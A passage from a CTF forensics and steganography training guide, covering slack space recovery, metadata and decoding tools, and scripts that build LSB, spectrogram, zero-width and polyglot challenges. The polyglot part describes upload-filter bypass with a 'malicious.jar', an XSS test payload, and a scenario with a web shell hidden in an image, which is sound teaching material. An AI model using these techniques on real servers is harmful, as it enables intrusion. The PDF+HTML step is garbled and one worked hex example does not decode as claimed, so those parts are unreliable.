Forensically, the discovery of meaningful data within slack space is strong evidence of **data hiding** or steganography. When data is injected into this area, standard operating system tools that rely on the file system metadata (the Directory Entry or MFT record) to determine the file's logical end will ignore the slack space, thus obscuring the hidden content from the casual user. The investigator must use tools that read the disk at the **physical allocation level**, bypassing the file system's logical view.

#### 2. Practical Implementation (The "How-To")

The key to solving this challenge is using tools that operate at the raw disk level to read the allocated clusters beyond the file's End-of-File (EOF) marker. **The Sleuth Kit (TSK)** is the primary toolset for this task.

Step 1: Identifying the Target Cluster Allocation

First, the investigator must determine which cluster(s) contain the target file's data and, critically, locate the file's inode or MFT entry number.

Bash

```
# Assume the challenge image is 'evidence.dd' and the filesystem starts at offset 0 (common for raw disk images).
IMAGE="evidence.dd"
FILE_NAME="meeting_notes.txt"

# Use 'fls' (File System Lister) to find the file's metadata address (inode/MFT entry)
# '-r' displays deleted files, '-o' specifies the volume offset (default 0)
echo "--- Step 1: Finding Inode Number ---"
fls -r "$IMAGE" | grep "$FILE_NAME"
# Output example: r/r 12345-128-1: meeting_notes.txt  (Inode is 12345)
```

Step 2: Raw Data Extraction using icat

The icat (Inode Content) utility from TSK is used to extract the raw content of the file, including all allocated clusters, regardless of the logical size reported in the file system. This will dump the legitimate file data followed by the slack space data.

Bash

```
# Assume the inode number is 12345 from the previous step
INODE=12345
OUTPUT_FILE="raw_data_with_slack.bin"

echo "--- Step 2: Extracting Raw Content + Slack ---"
# icat extracts the full cluster chain associated with the inode
icat "$IMAGE" "$INODE" > "$OUTPUT_FILE"

echo "Extracted content saved to $OUTPUT_FILE. Size: $(stat -c%s $OUTPUT_FILE) bytes."
# Note: The extracted size should be a multiple of the cluster size (e.g., 4096 bytes)
```

Step 3: Locating the Hidden Data

The extracted file (raw_data_with_slack.bin) now contains the legitimate file content followed by the hidden slack payload. The investigator must search the trailing portion of this file.

Bash

```
# Use 'strings' to quickly find printable text hidden in the binary data
echo "--- Step 3: Finding Hidden Strings ---"
strings "$OUTPUT_FILE" | tail -n 5 # Show the last 5 printable strings

# Alternatively, use a hex editor to manually inspect the end of the logical file content
# This requires knowing the logical size (e.g., 250 bytes) and skipping to that offset.
```

Alternative Method: Raw Cluster Extraction with blkcat

If the file is known to fit entirely within one cluster (common for small flag files), you can use blkcat to dump the raw cluster, but this requires knowing the data unit address (DADDR) first.

#### 3. Example Scenario

Scenario Title: The Ghost in the Machine (Solution)

Context: You have employee_laptop.dd and are tasked with finding the encryption key hidden in meeting_notes.txt (Logical Size: 250 bytes).

Solution Steps:

1. **Locate:** Use `fls` on the image to find the inode number for `meeting_notes.txt` (e.g., `100`).
    
2. **Extract Slack:** Run `icat employee_laptop.dd 100 > full_cluster.bin`. This file is now 4096 bytes (the cluster size).
    
3. **Analyze:** Open `full_cluster.bin` in a hex editor. Jump to offset `0xFA` (250 bytes, the EOF).
    
4. **Discovery:** Immediately after the 250th byte, the hex editor reveals the cleartext string: `4B 65 79 3A 20 41 45 53 5F 53 4C 41 43 4B 5F 4D 41 53 54 45 52` which translates to "Key: AES_SLACK_MASTER". The flag has been successfully recovered from the slack space.
    

#### 4. Key Tools

- **The Sleuth Kit (TSK):** The essential suite for physical file system analysis, specifically `fls` (listing metadata) and `icat`/`blkcat` (raw cluster content extraction).
    
- **Hex Editors (HxD, 010 Editor):** Necessary for manually verifying the exact offset of the EOF and viewing the hidden payload bytes after the logical end.
    
- **strings:** A simple, powerful utility used to filter the raw cluster output for any hidden printable ASCII or Unicode text strings.

---

### Metadata extraction using exiftool or strings

#### 1. Technical Theory

Metadata is "data about data"—information embedded within a file that describes its content, origin, and technical specifications.

- **Structured Metadata:** Formats like JPEG, PDF, and Office documents use specific standards (EXIF, IPTC, XMP) to store data like camera model, GPS coordinates, author names, and modification timestamps. Tools like `exiftool` parse these standardized headers.
    
- **Unstructured/Raw Strings:** Binary files (executables, raw dumps) or file formats with appended data often contain sequences of printable characters (ASCII or Unicode) amidst non-printable machine code. The `strings` utility scans binary data to extract these readable sequences, often revealing hardcoded passwords, URLs, or hidden flags that do not reside in formal metadata structures.
    

#### 2. Practical Implementation (The "How-To")

Perspective: The Investigator

The following steps detail how to extract hidden information from a suspect file named evidence.jpg or suspicious.bin.

A. Quick Analysis with strings

This is often the first step in forensics to identify low-hanging fruit.

1. Basic ASCII Extraction:
    
    Prints all printable character sequences at least 4 characters long.
    
    Bash
    
    ```
    strings suspicious.bin
    ```
    
2. Filtering for Flags:
    
    Pipe the output to grep to search for known flag formats (e.g., "CTF", "flag{").
    
    Bash
    
    ```
    strings suspicious.bin | grep -i "flag"
    ```
    
3. Handling Different Encodings (Crucial):
    
    Standard strings looks for ASCII. Windows artifacts often use little-endian UTF-16 (Unicode). If you miss this, you will miss the flag.
    
    Bash
    
    ```
    # Scan for 16-bit little-endian strings (Windows Unicode)
    strings -e l suspicious.bin
    
    # Scan for 16-bit big-endian strings
    strings -e b suspicious.bin
    ```
    
4. Locating Offset:
    
    If you need to know where in the file the string is located (for hex editing later):
    
    Bash
    
    ```
    # -t x prints the offset in hexadecimal
    strings -t x suspicious.bin
    ```
    

B. Deep Analysis with exiftool

Used when the file is a media or document format.

1. Full Metadata Dump:
    
    Extract all available tags.
    
    Bash
    
    ```
    exiftool evidence.jpg
    ```
    
2. Revealing Hidden/Unknown Tags:
    
    CTF creators often hide flags in non-standard or undefined tags which standard viewers ignore.
    
    Bash
    
    ```
    # -u: Extract unknown tags
    # -U: Extract unknown binary tags (rare but possible)
    exiftool -u -U evidence.jpg
    ```
    
3. Analyzing specific groups:
    
    Sometimes data is hidden in the ICC Profile or XMP data specifically.
    
    Bash
    
    ```
    exiftool -G1 -a evidence.jpg
    ```
    

#### 3. Example Scenario

Scenario: "The Leaked Mockup"

You are provided with a graphic design file named design_v2.png. The prompt implies the designer left a secret note.

1. **Initial Check:** You open the image and see a standard logo.
    
2. **Strings Attempt:** You run `strings design_v2.png | grep "flag"`, but it returns nothing.
    
3. **Exiftool Analysis:** You run `exiftool design_v2.png`.
    
    - The output shows standard dimensions and color depth.
        
    - However, the `Comment` field or `XPComment` (Windows specific) contains a Base64 string.
        
4. **Solution:**
    
    Bash
    
    ```
    exiftool -Comment design_v2.png
    # Output: Comment : ZmxhZ3toaWRkZW5faW5fdGhlX2hlYWRlcnN9
    ```
    
    Decoding the Base64 string reveals: `flag{hidden_in_the_headers}`.
    

#### 4. Key Tools

- **ExifTool:** The gold standard for reading, writing, and editing meta-information in a wide variety of files.
    
- **Strings (GNU Binutils):** A fundamental Unix utility for printing the strings of printable characters in files.
    
- **Grep:** Essential for filtering massive output from `strings` or `exiftool` when looking for specific patterns.
    

---

### Automated decoding and cipher identification (CyberChef workflows)

#### 1. Technical Theory

Automated decoding relies on **heuristic analysis** and **pattern recognition** to identify encoding schemes without a known key.

- **Character Set Analysis:** Tools analyze the distribution of bytes. For example, High entropy (randomness) often indicates encryption or compression, while specific character ranges (A-Za-z0-9+/) suggest Base64.
    
- **Magic/Heuristics:** Operations like CyberChef's "Magic" attempt brute-force decoding using a library of known protocols (Base64, Hex, XOR, Rot13) and score the output based on English dictionary matches or regex patterns (like `flag{...}`).
    
- **Recursive Decoding:** Advanced automation requires a "depth-first" or "breadth-first" search approach to peel back multiple layers of encoding (e.g., a string Base64 encoded, then Hex encoded, then Rot13 rotated).
    

#### 2. Practical Implementation (The Investigator)

To solve challenges with unknown or multi-layered encodings, investigators move from simple browser-based heuristics to advanced CLI automation.

A. CyberChef "Magic" Workflows

The "Magic" operation is the first line of defense. It attempts to detect encoding by calculating statistical likelihood.

- **Basic Magic Recipe:**
    
    1. Input your ciphertext.
        
    2. Drag `Magic` to the recipe.
        
    3. **Settings:** Ensure `Intensive mode` is checked if the initial pass fails. Set `Depth` to at least `5` for multi-layer challenges.
        
- Advanced "Brute Force" Recipe (When Magic Fails):
    
    If "Magic" fails, use a logical flow to normalize data before inspection.
    
    Plaintext
    
    ```
    // Sample CyberChef Recipe Logical Flow
    1. From Hex (Auto-detect)
    2. From Base64 (Remove non-alphabet chars: true)
    3. XOR Brute Force (Key Length: 1-2, Sample length: 100)
    4. ROT13 (Amount: 1-25)
    5. Regular Expression (Regex: flag\{.*\} or [A-Za-z0-9]{20,})
    ```
    
    _Tip:_ Use the `Fork` operation to apply multiple decoders in parallel if you suspect the input contains multiple independent encoded strings.
    

B. CLI Automation (Ciphey & Ares)

For challenges with 5+ layers of encoding or non-standard ciphers, browser tools often time out. CLI tools using Natural Language Processing (NLP) are superior.

- Option 1: Ciphey (Python-based)
    
    Uses deep learning to identify plaintext. It is slower but supports a vast array of legacy ciphers.
    
    Bash
    
    ```
    # Install
    python3 -m pip install ciphey --upgrade
    
    # Usage against a string
    ciphey -t "WW91ciBlbmNvZGVkIHRleHQgaGVyZQ=="
    
    # Usage against a file (recommended for large logs)
    ciphey -f encrypted_log.txt --verbose
    ```
    
- Option 2: Ares (Rust-based)
    
    The successor to Ciphey. Significantly faster but has fewer total decoders. Use this for time-sensitive CTFs or massive datasets.
    
    Bash
    
    ```
    # Install (requires Rust/Cargo)
    cargo install project_ares
    
    # Usage
    ares "encoded_string_here"
    ```
    

#### 3. Example Scenario

Scenario: The "Russian Doll" Log Entry

An investigator finds a suspicious string in a server access log:

56 6d 30 77 64 47 56 73 62 33 5a 6b 49 48 52 6f 61 57 34 67 5a 6d 78 68 5a 33 74 6f

**Analysis Steps:**

1. **Layer 1 (Hex):** The investigator recognizes the space-separated hex bytes. Decoding them yields `Vm0wdGVs....`.
    
2. **Layer 2 (Base64):** The resulting string ends in `==`, suggesting Base64. Decoding yields another jumbled string.
    
3. **Layer 3 (ROT13):** `Ciphey` detects the final layer is a ROT13 shift.
    
4. **Result:** The tool peels back all three layers automatically to reveal `flag{automation_is_key}`.
    

#### 4. Key Tools

- **CyberChef:** The standard web-based "Swiss Army Knife" for manual and semi-automated decoding.
    
- **Ciphey:** An automated decryption tool using natural language processing to identify encodings without a key.
    
- **Ares:** A high-performance decoder written in Rust, designed as a faster alternative to Ciphey.
    

Mastering CyberChef: The Ultimate Guide for Security Analysts
https://www.youtube.com/watch?v=-ldcYuMjRII

This video provides a visual walkthrough of CyberChef's interface and demonstrates how to build the specific decoding recipes discussed above.

---

# Module 2: Steganography & Data Concealment

## The Architect (Creation)



### Embedding payloads via LSB in PNG/BMP.

#### 1. Technical Theory

Least Significant Bit (LSB) steganography is the most fundamental technique in image data concealment. It exploits the way computers represent color values. In a typical 24-bit RGB image, each pixel consists of three bytes (Red, Green, Blue), ranging from 0 to 255.

The "Least Significant Bit" is the last bit in the binary representation of a byte (e.g., in `1011010**1**`, the bold `1` is the LSB). Changing this bit alters the integer value by only 1 (e.g., changing a Red value from 200 to 201). This modification is visually imperceptible to the human eye but allows an architect to store 1 bit of data per color channel (3 bits per pixel).

**Key Constraints:**

- **Lossless Formats Only:** This technique relies on exact pixel values. It works on BMP and PNG. It **fails** on JPEG because JPEG compression algorithms approximate colors to save space, which destroys the delicate LSB data.
    
- **Capacity:** The maximum payload size is determined by $\text{Image Width} \times \text{Image Height} \times \text{Channels} \div 8$ bytes.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Architect**

To create an LSB challenge, you need a script that takes a cover image and a payload (the Flag), converts the payload into a binary stream, and injects it into the pixel data.

Below is a Python 3 script using the `Pillow` library to craft a challenge image.

**Prerequisites:**

Bash

```
pip install Pillow
```

**The Builder Script (`lsb_encoder.py`):**

Python

```
from PIL import Image

def text_to_bits(text, encoding='utf-8', errors='surrogatepass'):
    """Converts a string to a list of bits (integers 0 or 1)."""
    bits = bin(int.from_bytes(text.encode(encoding, errors), 'big'))[2:]
    return [int(b) for b in bits.zfill(8 * ((len(bits) + 7) // 8))]

def embed_lsb(image_path, secret_message, output_path):
    img = Image.open(image_path)
    width, height = img.size
    pixels = img.load()
    
    # Append a delimiter to the message so the solver knows when to stop reading
    # Common delimiters: Null byte (0x00) or a custom string like "EOF"
    full_message = secret_message + "\0" 
    message_bits = text_to_bits(full_message)
    data_len = len(message_bits)
    
    print(f"[+] Embedding {data_len} bits into {width}x{height} image...")
    
    if data_len > width * height * 3:
        raise ValueError("[-] Error: Message too long for this image capacity.")

    idx = 0
    for y in range(height):
        for x in range(width):
            if idx < data_len:
                r, g, b = img.getpixel((x, y))
                
                # Modify Red LSB
                if idx < data_len:
                    r = (r & ~1) | message_bits[idx]
                    idx += 1
                
                # Modify Green LSB
                if idx < data_len:
                    g = (g & ~1) | message_bits[idx]
                    idx += 1
                    
                # Modify Blue LSB
                if idx < data_len:
                    b = (b & ~1) | message_bits[idx]
                    idx += 1
                
                pixels[x, y] = (r, g, b)
            else:
                break
        if idx >= data_len:
            break
            
    img.save(output_path, "PNG") # Always save as PNG or BMP to prevent compression
    print(f"[+] Artifact saved to {output_path}")

# --- Usage ---
# Create a dummy image or use an existing one
# embed_lsb("cover_image.png", "CTF{h1dd3n_1n_th3_n01s3}", "challenge.png")
```

**Architect Notes:**

- **Bit Plane selection:** The script above uses Sequential LSB (filling R, then G, then B of pixel 0, then moving to pixel 1). To increase difficulty, you can modify the script to embed only in the **Blue Channel** (least sensitive to the human eye) or use a Pseudo-Random Number Generator (PRNG) seeded with a key to scatter the bits across the image.
    
- **Delimiter:** Always include a null byte or specific terminator. Without it, the investigator will extract "garbage" data (random noise) after the flag ends, making it harder to spot the actual flag text.
    

#### 3. Example Scenario

Title: Operation White Noise

Scenario: Intelligence has intercepted a communications logo from a suspected insider threat group, "The NullSet." The image appears to be a standard marketing asset (logo_v2.png), but metadata analysis proved clean. We suspect they are using the image itself to smuggle credentials.

The Artifact: A standard PNG file where the ASCII string flag{b1t_sh1ft1ng_m4st3r} has been embedded sequentially into the LSB of the RGB channels. The challenger must extract the binary data and convert it back to ASCII.

#### 4. Key Tools

These are the tools the Investigator will likely use to attempt to solve your challenge. You should test your artifact against them to ensure solvability.

- **zsteg:** (Linux/Ruby) The gold standard for solving LSB challenges in PNGs. It automatically iterates through all channel combinations (LSB, MSB, RGB, BGR) to find hidden ASCII data.
    
- **StegSolve:** (Java) A classic GUI tool that allows investigators to visually browse through specific bit planes (e.g., "Red bit 0") to see visual anomalies or extract data.
    
- **CyberChef:** (Web) Using the "Extract LSB" recipe. Useful for manual extraction if automatic tools fail or if the bit order is non-standard.
    

---

### Hiding text in audio spectrograms (Spectrogram embedding)

#### 1. Technical Theory

A spectrogram is a visual representation of the spectrum of frequencies of a signal as it varies with time. In a standard spectrogram:

- **X-axis:** Represents Time.
    
- **Y-axis:** Represents Frequency (Pitch).
    
- **Color/Intensity:** Represents Amplitude (Loudness) at that specific frequency and time.
    

**Spectrogram Steganography** works by reversing this visualization process (Inverse Short-Time Fourier Transform or similar mapping techniques). The architect starts with an image (usually text on a black background). The image is scanned column by column (time steps). The vertical position of a pixel determines the frequency of the sine wave generated, and the brightness of the pixel determines the volume of that sine wave. When these sine waves are summed and saved as an audio file, the resulting sound is often described as "alien" or "glitchy," but visual analysis recreates the original image.

#### 2. Practical Implementation (The Architect)

To create this challenge, you first need an image containing your text/flag, and then a method to convert that image into audio data.

Step 1: Create the Source Image

Create a .bmp or .png file with a black background and white text.

- **Canvas:** Keep it small (e.g., 500px wide by 200px high).
    
- **Contrast:** High contrast (Pure black `#000000` and Pure white `#FFFFFF`) yields the clearest audio visual.
    
- **Positioning:** Text placed lower in the image will result in lower pitched sounds; text higher up will be high-pitched/ultrasonic.
    

Step 2: Conversion via Python

While tools like Coagula Light are traditional for this, a Python script gives the Architect more control over frequency mapping and sample rates.

**Prerequisites:** `pip install numpy scipy pillow`

Python

```
import numpy as np
from PIL import Image
from scipy.io import wavfile

def image_to_spectrogram_audio(image_path, output_wav, duration=5.0, sample_rate=44100):
    # Load image and convert to grayscale
    img = Image.open(image_path).convert('L')
    # Flip image vertically because spectrograms plot low freq at bottom, high at top
    # But image coordinates (0,0) are top-left.
    img = img.transpose(Image.FLIP_TOP_BOTTOM)
    pixels = np.array(img)
    
    height, width = pixels.shape
    
    # Generate time axis
    total_samples = int(duration * sample_rate)
    t = np.linspace(0, duration, total_samples)
    
    # Initialize output audio array
    audio = np.zeros(total_samples)
    
    # Frequency range (avoiding sub-bass and extreme ultrasonic for audibility/clarity)
    min_freq = 500
    max_freq = 15000
    freqs = np.linspace(min_freq, max_freq, height)
    
    # Samples per pixel column
    samples_per_column = total_samples // width
    
    print("Synthesizing audio... this may take a moment.")
    
    for x in range(width):
        # Calculate start and end indices for this column in the audio array
        start_idx = x * samples_per_column
        end_idx = start_idx + samples_per_column
        
        if end_idx > total_samples:
            break
            
        # Get the time slice for this column
        t_slice = t[start_idx:end_idx]
        
        # Signal for this specific time slice
        column_signal = np.zeros_like(t_slice)
        
        # Iterate through rows (frequencies)
        # Optimization: Only process pixels with brightness > 10 to save time
        active_pixels = np.where(pixels[:, x] > 10)[0]
        
        for y in active_pixels:
            intensity = pixels[y, x] / 255.0
            frequency = freqs[y]
            # Add sine wave: A * sin(2 * pi * f * t)
            column_signal += intensity * np.sin(2 * np.pi * frequency * t_slice)
            
        # Add this column's sound to the main audio track
        audio[start_idx:end_idx] = column_signal

    # Normalize audio to 16-bit integer range
    max_val = np.max(np.abs(audio))
    if max_val > 0:
        audio = (audio / max_val) * 32767
    
    wavfile.write(output_wav, sample_rate, audio.astype(np.int16))
    print(f"Audio saved to {output_wav}")

# Execution
# Ensure you have an image named 'flag_input.png' in the directory
try:
    image_to_spectrogram_audio('flag_input.png', 'suspicious_noise.wav', duration=10.0)
except FileNotFoundError:
    print("Error: Please provide an input image named 'flag_input.png'")
```

Step 3: Verification

Always verify your generated artifact. Open suspicious_noise.wav in a spectrogram viewer. If the text is blurry, increase the duration in the script (stretching the audio provides better horizontal resolution).

#### 3. Example Scenario

Scenario Name: "The Whistleblower"

Description: A compromised employee leaked a recording of a server room fan. The company believes the audio file fan_noise_v2.wav contains an encryption key.

Artifact: A 10-second .wav file that sounds like screeching, metallic grinding, or high-pitched chirping.

Solution: The investigator opens the file in a spectral analyzer. By adjusting the view to "Spectrogram" rather than "Waveform" and modifying the contrast/frequency scale, the text FLAG{s0und_0f_s1lence} becomes clearly visible written across the frequency spectrum.

#### 4. Key Tools

- **Coagula Light:** (Windows) The classic, go-to tool for converting BMP images directly into sound layers.
    
- **Sonic Visualizer:** (Cross-platform) Excellent for viewing generated spectrograms with high-contrast settings to verify the challenge.
    
- **Audacity:** Standard audio editor; switch track view to "Spectrogram" to visualize the flag.

---

### Creating polyglot files (valid as multiple file types)

#### 1. Technical Theory

A polyglot file is a single binary stream that is valid under two or more different file formats. This relies on the specific parsing behaviors of different file specifications.

- **Parsing Direction:** Some formats (like JPEG or PDF) rely heavily on a specific Header (Magic Bytes) at the beginning of the file. Others (like ZIP) are parsed from the end of the file (looking for the End of Central Directory record).
    
- **Slack Space & Comments:** many file formats allow for "comment" blocks or metadata fields where arbitrary binary data can be stored without affecting the rendering of the primary format.
    
- **Tolerance:** Parsers often ignore "garbage" data appended after the valid End-of-File (EOF) marker.
    

By aligning these structural requirements—for example, putting Format B inside the comment block of Format A, or appending Format B after Format A's footer—an architect can create a file that acts as an image to a photo viewer but an executable archive to a terminal.

#### 2. Practical Implementation (The "How-To")

Method A: The Append Technique (JPEG + ZIP)

This is the simplest form of polyglot. JPEGs function from the Start of Image (SOI) FF D8 to the End of Image (EOI) FF D9. ZIP files are read by scanning the end of the file backwards. By concatenating them, the file renders as an image but extracts as an archive.

- **Command Line (Linux/macOS):**
    
    Bash
    
    ```
    # Create a valid ZIP file containing the flag
    zip flag_archive.zip flag.txt script.sh
    
    # Concatenate the cover image and the archive
    cat cover_image.jpg flag_archive.zip > polyglot.jpg
    ```
    
- **Command Line (Windows CMD):**
    
    DOS
    
    ```
    type cover_image.jpg flag_archive.zip > polyglot.jpg
    ```
    

Method B: The GIFAR (GIF + JAR/ZIP) Construction

A GIFAR is a file that is both a valid GIF image and a valid Java ARchive (JAR). This is useful for "upload scanner bypass" challenges where a server validates the file header as an image, but the file can be executed as Java.

Python Script for Offset Injection:

This script creates a polyglot by placing a secondary payload specifically into the unused space of a container file, or appending it if no space is defined.

Python

```
import struct
import sys

def create_gifar(gif_path, jar_path, output_path):
    """
    Creates a GIFAR polyglot by appending a JAR (ZIP) to a GIF.
    Since GIFs ignore data after the trailer (3B), and JARs are read 
    from the footer up, this creates a valid dual-format file.
    """
    
    try:
        with open(gif_path, 'rb') as f:
            gif_data = f.read()
            
        with open(jar_path, 'rb') as f:
            jar_data = f.read()

        # GIF89a Header Check
        if gif_data[:6] not in [b'GIF87a', b'GIF89a']:
            print("[-] Error: Source image does not appear to be a valid GIF.")
            return

        # Simple Append Strategy for GIFAR
        # A more complex version would inject into global color table comments
        # if size constraints were an issue.
        polyglot_data = gif_data + jar_data

        with open(output_path, 'wb') as f:
            f.write(polyglot_data)
            
        print(f"[+] Polyglot created successfully: {output_path}")
        print(f"[+] Size: {len(polyglot_data)} bytes")

    except FileNotFoundError as e:
        print(f"[-] File not found: {e}")

# Usage Example
# create_gifar('avatar.gif', 'malicious.jar', 'avatar_poly.gif')
```

Method C: PDF + HTML (Polyglot)

This requires manual hex editing to ensure the PDF header remains valid while the HTML is commented out within the PDF structure, or vice versa.

**Hex Editor Strategy:**

1. Open a valid PDF.
    
2. Ensure the header starts with `%PDF-1.4`.
    
3. Immediately follow the PDF header with `` later in the file (often in an object stream) and insert the HTML payload `<script>alert(1)</script>`.
    
4. This allows the file to execute Javascript if opened in a browser as HTML, but render as a document if opened in a PDF reader.
    

#### 3. Example Scenario

Scenario Name: "The Dual-Face Database"

Description: The CTF participant gains access to an employee database containing profile pictures. The goal is to execute code on the server.

The Artifact: A file named backup_profile.jpg.

The Setup: The architect creates a PHP script web_shell.php and zips it into payload.zip. This zip is appended to innocent_face.jpg.

The Twist: The web server is configured to allow .jpg uploads but accidentally has the PHP interpreter configured to execute files containing \<?php tags regardless of extension, OR the participant must use unzip on the server side via a command injection vulnerability to extract the web shell from the image.

#### 4. Key Tools

- **Mitra:** A specialized command-line tool designed to generate binary polyglots (e.g., GIF+JAR, PDF+JPG) automatically.
    
- **HxD / 010 Editor:** Essential hex editors for manually stitching file parts and verifying header/footer integrity.
    
- **Ange Albertini’s Corkami:** Not a software tool, but the repository `corkami` contains the "standard" structural diagrams and proof-of-concept files for creating advanced polyglots.

---

### Zero-width character injection and whitespace manipulation (SNOW)

#### 1. Technical Theory

Text steganography hides data within the formatting or non-printable characters of a text file without altering the semantic meaning or visual appearance of the cover text.

- **Zero-Width Characters:** This technique utilizes Unicode characters that render with zero width, making them invisible to the naked eye. Common characters include the Zero Width Space (`U+200B`), Zero Width Non-Joiner (`U+200C`), and Zero Width Joiner (`U+200D`). Data is hidden by converting a secret message into binary and mapping bits to specific zero-width characters (e.g., `U+200B` represents `1`, `U+200C` represents `0`), which are then injected between normal letters.
    
- **Whitespace Manipulation (SNOW):** The "Steganographic Nature Of Whitespace" (SNOW) technique exploits the ASCII format. It appends tabs and spaces to the end of lines in a text file. Since many text editors and terminal viewers trim or ignore trailing whitespace, the payload remains unnoticed. The data is often compressed (Huffman coding) and encrypted (ICE algorithm) before being mapped to whitespace sequences (usually up to 7 spaces/tabs per 3 bits).
    

#### 2. Practical Implementation (The "How-To")

Since you are the **Architect**, you will use two distinct methods to generate these artifacts: a custom Python script for Unicode Zero-Width injection and the `stegsnow` tool for ASCII whitespace manipulation.

Method A: Zero-Width Character Injection (Python Script)

This script takes a cover text and a secret string, converts the secret to binary, and injects zero-width characters into the cover text.

Python

```
def hide_zero_width(cover_text, secret_message):
    # Zero-width characters to use for binary representation
    # U+200B (Zero Width Space) -> 1
    # U+200C (Zero Width Non-Joiner) -> 0
    # U+200D (Zero Width Joiner) -> Delimiter (optional, used here to mark end)
    
    zw_one = '\u200b'
    zw_zero = '\u200c'
    
    # Convert secret message to binary
    binary_secret = ''.join(format(ord(i), '08b') for i in secret_message)
    
    encoded_secret = ""
    for bit in binary_secret:
        if bit == '1':
            encoded_secret += zw_one
        else:
            encoded_secret += zw_zero
            
    # Inject the encoded secret after the first character of the cover text
    # This creates the artifact
    if len(cover_text) > 0:
        stego_text = cover_text[0] + encoded_secret + cover_text[1:]
        return stego_text
    else:
        return encoded_secret

# Configuration
cover = "This looks like a normal log entry."
flag = "CTF{un1c0d3_h1dd3n}"

# Execution
artifact = hide_zero_width(cover, flag)

# Save to file
with open("system_log_zw.txt", "w", encoding="utf-8") as f:
    f.write(artifact)

print(f"Artifact created. Length of string: {len(artifact)}")
# Note: The file size will increase significantly compared to visual length.
```

Method B: Whitespace Manipulation (SNOW)

You will need the stegsnow (or snow) tool installed. This works best with ASCII text files.

1. **Prepare the Cover Text:** Create a standard text file (e.g., `poem.txt`).
    
    Bash
    
    ```
    echo "The quick brown fox jumps over the lazy dog." > poem.txt
    echo "Documentation for the server protocol." >> poem.txt
    ```
    
2. **Embed the Data:** Use the following command to conceal the flag.
    
    - `-C`: Compress the data.
        
    - `-m`: The message string (the flag).
        
    - `-p`: (Optional) Password protect the hidden data.
        
    - Input file: `poem.txt`
        
    - Output file: `poem_stego.txt`
        
    
    Bash
    
    ```
    stegsnow -C -m "CTF{wh1t3_sp4c3_gh0st}" -p "admin123" poem.txt poem_stego.txt
    ```
    
3. **Verification:** Attempting to `cat` the file will look identical to the original, but highlighting the text in a GUI editor will reveal the trailing tabs/spaces.
    

#### 3. Example Scenario

**Scenario Title:** "The Invisible Contract"

Description:

Participants are given a file named employment_contract.txt. The scenario prompt states: "The rogue employee leaked the credentials, but claimed they were 'written in the whitespace of the agreement'. Find the password to the secure server."

**The Artifact:**

- The file contains standard legal text.
    
- Using a hex editor or a specialized tool reveals that the first paragraph uses **Zero-Width characters** to spell out a hint: "Use SNOW on the last paragraph."
    
- The last paragraph of the text file contains **trailing whitespace (SNOW)** that, when decrypted with the password found in a previous challenge (or no password if configured that way), reveals the flag: `CTF{7r41l1ng_by73s_r3v34l_4ll}`.
    

#### 4. Key Tools

- **stegsnow (or snow):** The industry-standard command-line utility for whitespace steganography in ASCII files.
    
- **ZwSteg / 330k (Online tools):** Various online decoders and Python libraries specifically designed to detect and strip Zero-Width Unicode characters.
    
- **xxd / Hex Editors:** Essential for manual verification. Investigators use these to spot `E2 80 8B` (UTF-8 for ZWSP) sequences or `09` / `20` (Tab/Space) patterns at line ends.
    

---

## The Investigator (Solution)




### Visual plane analysis and bit plane extraction (zsteg, stegsolve)

### Audio spectrum analysis (Audacity, Sonic Visualiser)

### Polyglot decomposition and extraction

#### 1. Technical Theory

Polyglot decomposition is the process of identifying and separating distinct file formats merged into a single binary blob. Detection relies on understanding that standard file identification tools (like the OS `file` command) often stop analysis after matching the first valid magic byte signature they encounter at offset 0.

- **The Anomaly:** A file's size may exceed the expected size for its content (e.g., a 5MB image that looks low resolution).
    
- **Signature Scanning:** Extraction requires scanning the entire binary stream for secondary "Magic Bytes" (headers) or Footers that shouldn't exist in the primary format (e.g., finding `PK\x03\x04` inside a JPEG).
    
- **Entropy Analysis:** Distinct file types have different entropy profiles. A compressed archive appended to an uncompressed bitmap will show a sharp jump in entropy.
    

#### 2. Practical Implementation (The "How-To")

Phase 1: Detection & Automated Extraction

The primary tool for this is binwalk. It scans the file for known signatures and extracts them automatically.

- **Command Line (Basic Analysis):**
    
    Bash
    
    ```
    # Check what the OS thinks the file is
    file unknown_artifact.jpg
    
    # Scan for embedded signatures without extracting
    binwalk unknown_artifact.jpg
    ```
    
    _Output interpretation:_ If `binwalk` returns a list showing a JPEG header at offset 0 and a Zip archive data at offset 15400, you have a polyglot.
    
- **Command Line (Automated Extraction):**
    
    Bash
    
    ```
    # Extract all detected files recursively
    binwalk -eM unknown_artifact.jpg
    ```
    
    - `-e`: Extract known file types.
        
    - `-M`: Matryoshka mode (scan extracted files for further embedded files).
        

Phase 2: Manual Decomposition (The "dd" method)

If automated tools fail (or if the challenge Architect obfuscated the magic bytes slightly), you must carve the file manually based on the offsets found in the hex editor or binwalk.

- **Scenario:** `binwalk` detects a ZIP header starting at offset `14052` inside `image.png`.
    
- **Extraction using `dd`:**
    
    Bash
    
    ```
    # Syntax: skip=OFFSET, if=INPUT, of=OUTPUT, bs=1 (byte-level precision)
    dd if=image.png of=extracted_data.zip skip=14052 bs=1
    ```
    

Phase 3: Python Analysis Script

Use Python to search for specific headers if you suspect a custom polyglot (e.g., a specific challenge format) that tools miss.

Python

```
import sys

def find_signatures(file_path):
    # Common signatures to hunt for
    signatures = {
        b'\x50\x4B\x03\x04': 'ZIP Archive',
        b'\x25\x50\x44\x46': 'PDF Document',
        b'\x89\x50\x4E\x47': 'PNG Image',
        b'\xCA\xFE\xBA\xBE': 'Java Class/Mach-O'
    }

    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        print(f"[*] Scanning {file_path} ({len(data)} bytes)...")
        
        for sig, label in signatures.items():
            offset = data.find(sig)
            # Loop to find ALL occurrences, not just the first
            while offset != -1:
                print(f"[+] Found {label} signature at offset: {offset} (0x{offset:X})")
                offset = data.find(sig, offset + 1)

    except FileNotFoundError:
        print("[-] File not found.")

if __name__ == "__main__":
    find_signatures("strange_file.gif")
```

#### 3. Example Scenario

Scenario Name: "The Heavy Document"

The Artifact: A file named company_policy.pdf is provided. It opens perfectly in Adobe Reader and displays boring text.

The Indicator: The file is 4MB, but the text content is only 2 pages long.

The Solution: 1. Running binwalk company_policy.pdf reveals a ZIP header located at offset 0x2050.

2. The investigator runs binwalk -e company_policy.pdf.

3. A directory _company_policy.pdf.extracted is created, containing flag.txt and creds.db.

4. The PDF viewer ignored the data appended after the PDF \%%EOF marker, but the data was a valid ZIP structure containing the flag.

#### 4. Key Tools

- **Binwalk:** The absolute standard for analyzing firmware images and polyglots. It correlates binary data with a vast library of file signatures.
    
